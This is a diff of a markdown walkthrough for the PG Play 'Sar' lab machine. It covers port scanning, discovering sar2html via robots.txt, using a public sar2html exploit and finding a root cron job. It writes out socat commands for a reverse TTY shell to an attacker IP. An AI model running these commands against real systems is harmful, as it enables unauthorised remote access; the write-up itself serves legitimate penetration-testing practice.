@@ -1,19 +1,20 @@
 # PG Play - Sar
 ## Author: Love Sharma
-### Released on:Jul 20, 2020
+## Released on: Jul 20, 2020
+### Difficulty: Easy
+### Community Difficulty: Easy
+### Description: This is not a conventional foothold-privesc type of machine. Only proof.txt is a valid flag.
+| Step: | Notes: |
+| --- | --- |
+| 1. | I ran a all ports nmap scan without a T4 switch to get started and ran another in parallel for speed with a T4 switch and of only common ports. |
+| 2. | My fast NMAP scan found port 80 opened out of habit I manually checked for common files in the web directory, and found sar2html in robots.txt. |
+| 3. | I found an exploit for sar2html which I figured I'd test out real quick. https://github.com/AssassinUKG/sar2HTML&ved=2ahUKEwi64tH145iFAxWepVYBHRJtC3gQFnoECAsQAQ&usg=AOvVaw09b6JcvNV9blzX1NKL5321 |
+| 4. | This gave me a foothold with a dumb shell as the www user, I now needed to spawn a tty shell. |
+| 5. | I tested a few different types of tty shell spawns, php, python, nc (no -e because of version issue but the nc tty without a -e didn't work either) the one that worked was a socat used below commands |
+| 5.1 | On my attack box ```socat file:`tty`,raw,echo=0 tcp-listen:4444``` |
+| 5.2 | On the target ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.175:4444``` | 
+| 6. | I'd transferred linpeas over earlier with the dumb shell but made it a priority to get a tty first. I found that I had access to the /var/spool/cron/crontabs folder which included cron jobs for the root user. I discovered that a script called finally.sh ran on every 5th minute as a cron job this file was only executable and readable by me. |
 
-
-This is not a conventional foothold-privesc type of machine. Only proof.txt is a valid flag.
-
-
-Target: 192.168.246.35
-
-
-Nmap found port 80 opened then found this sar2html in robots.txt
-
-
-
-Found exploit for sar2html
 
 
 
